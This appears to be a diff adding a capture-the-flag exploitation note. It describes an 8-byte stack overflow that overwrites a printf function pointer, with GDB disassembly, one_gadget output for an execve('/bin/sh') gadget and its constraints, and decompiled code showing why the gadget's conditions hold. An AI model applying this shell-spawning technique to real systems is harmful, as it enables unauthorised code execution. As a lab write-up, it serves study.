@@ -1,0 +1,39 @@
+8 byte overflow in stack
+can overwrite the printf ptr
+
+
+ → 0x5555555554f9 <main+374>       call   rcx
+   0x5555555554fb <main+376>       mov    rax, QWORD PTR [rbp-0x40]
+   0x5555555554ff <main+380>       mov    rdi, rax
+   0x555555555502 <main+383>       call   0x555555555190 <dlclose@plt>
+   0x555555555507 <main+388>       mov    edi, 0x0
+   0x55555555550c <main+393>       call   0x555555555180 <exit@plt>
+─────────────────────────────────────────────────────────────────────────────── arguments (guessed) ────
+*0x7ffff7df5770 (
+   $rdi = 0x00005555555561b8 → " Struck out. Game Over - You got %d hits and %d ru[...]",
+   $rsi = 0x0000000000000000,
+   $rdx = 0x0000000000000000,
+   $rcx = 0x00007ffff7df5770 → <printf+0> endbr64
+)
+
+
+0xebcf8 execve("/bin/sh", rsi, rdx)
+constraints:
+  address rbp-0x78 is writable
+  [rsi] == NULL || rsi == NULL
+  [rdx] == NULL || rdx == NULL
+
+
+this one_gadget satisfies the conditions
+So just use it
+
+
+That's prob why the author wrote
+
+local_30 = 0;
+local_2c = 0;
+....
+(*local_38)(" Struck out. Game Over - You got %d hits and %d runs.\n",local_30,local_2c)
+
+
+so that the one_gadget works and our lives become easier.
